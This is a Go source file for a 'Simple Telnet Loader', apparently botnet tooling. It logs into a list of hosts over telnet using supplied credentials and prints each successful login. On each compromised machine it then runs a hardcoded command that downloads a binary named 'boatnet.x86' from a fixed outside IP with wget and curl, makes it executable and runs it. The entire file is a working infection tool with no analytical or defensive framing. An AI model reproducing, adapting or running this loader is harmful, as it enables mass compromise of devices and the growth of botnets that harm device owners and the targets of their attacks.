package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

const (
	payload       = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.67.244.57/hiddenbin/boatnet.x86; curl -O http://103.67.244.57/hiddenbin/boatnet.x86; cat boatnet.x86 >WTF; chmod +x *; ./WTF\n"
	timeout       = 15 * time.Second
	readBackLines = 10 // max baris output payload yang dibaca
)

var loginPrompts = []string{"login:", "Login:", "username:", "Username:", "user:", "User:"}
var passwordPrompts = []string{"Password:", "password:", "passwd:", "Pass:"}
var shellPrompts = []string{"#", "$", ">", "~", "%", "@"}

var (
	totalTargets   = 0
	successCounter = 0
	mu             sync.Mutex
	wg             sync.WaitGroup
)

func main() {
	if len(os.Args) != 2 {
		fmt.Println("Usage: ./loader <target_file>")
		return
	}

	file, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Println("Failed to open file:", err)
		return
	}
	defer file.Close()

	var targets []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			targets = append(targets, line)
		}
	}

	totalTargets = len(targets)
	fmt.Printf("Simple Telnet Loader\n=====================\n")
	fmt.Printf("Loaded %d targets from %s\n\n", totalTargets, os.Args[1])

	for i, entry := range targets {
		wg.Add(1)
		go func(line string, index int) {
			defer wg.Done()
			handleTarget(line)
			printProgress(index + 1)
		}(entry, i)
	}

	wg.Wait()
	fmt.Printf("\n\n[✓] Done. Success: %d/%d\n", successCounter, totalTargets)
}

func handleTarget(entry string) {
	parts := strings.Split(entry, " ")
	if len(parts) != 2 {
		return
	}

	addr := parts[0]
	auth := strings.Split(parts[1], ":")
	if len(auth) != 2 {
		return
	}
	username := auth[0]
	password := auth[1]

	conn, err := net.DialTimeout("tcp", addr, timeout)
	if err != nil {
		return
	}
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(timeout))

	reader := bufio.NewReader(conn)

	if !expectAny(conn, reader, loginPrompts) {
		return
	}
	conn.Write([]byte(username + "\n"))

	if !expectAny(conn, reader, passwordPrompts) {
		return
	}
	conn.Write([]byte(password + "\n"))

	if !expectAny(conn, reader, shellPrompts) {
		return
	}

	// Log success + credentials
	mu.Lock()
	successCounter++
	fmt.Printf("\n[+] Success: %s | user: %s | pass: %s\n", addr, username, password)
	mu.Unlock()

	// Send payload
	conn.Write([]byte(payload))
	time.Sleep(500 * time.Millisecond) // tunggu output

	// Read response from telnet console
	output := readOutput(conn, reader)
	fmt.Printf("[*] Payload sent: %s\n", addr)
	fmt.Println("--------- Telnet Output ---------")
	fmt.Print(output)
	fmt.Println("--------- End Output ------------")
}

func expectAny(conn net.Conn, r *bufio.Reader, prompts []string) bool {
	buffer := ""
	timeoutChan := time.After(timeout)

	for {
		select {
		case <-timeoutChan:
			return false
		default:
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			b, err := r.ReadByte()
			if err != nil {
				continue
			}
			buffer += string(b)
			if len(buffer) > 4096 {
				buffer = buffer[len(buffer)-4096:]
			}
			for _, prompt := range prompts {
				if strings.Contains(buffer, prompt) {
					return true
				}
			}
		}
	}
}

func readOutput(conn net.Conn, r *bufio.Reader) string {
	var lines []string
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	for i := 0; i < readBackLines; i++ {
		line, err := r.ReadString('\n')
		if err != nil {
			break
		}
		lines = append(lines, strings.TrimRight(line, "\r\n"))
	}
	return strings.Join(lines, "\n")
}

func printProgress(current int) {
	percent := float64(current) / float64(totalTargets) * 100
	fmt.Printf("\r[Progress] %d/%d (%.1f%%)", current, totalTargets, percent)
}
